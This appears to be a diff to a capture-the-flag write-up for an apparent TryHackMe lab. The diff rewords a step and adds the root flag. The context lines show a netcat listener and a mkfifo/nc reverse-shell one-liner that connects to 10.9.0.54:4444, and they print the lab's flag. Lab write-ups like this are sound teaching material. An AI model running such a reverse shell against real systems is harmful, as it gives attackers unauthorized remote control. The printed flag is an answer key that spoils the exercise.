@@ -242,7 +242,7 @@ Now, let's start our listener:
 $ rlwrap nc -nlvp 4444
 ~~~
 
-On the remote host:
+And let's start our reverse shell on the remote host:
 
 ~~~
 .RUN mkfifo /tmp/wqivu; nc 10.9.0.54 4444 0</tmp/wqivu | /bin/sh >/tmp/wqivu 2>&1; rm /tmp/wqivu 
@@ -265,3 +265,5 @@ total 4
 cat flag.txt
 THM{y0u_g0t_th3_t3ln3t_fl4g}
 ~~~
+
+Root flag: `THM{y0u_g0t_th3_t3ln3t_fl4g}`
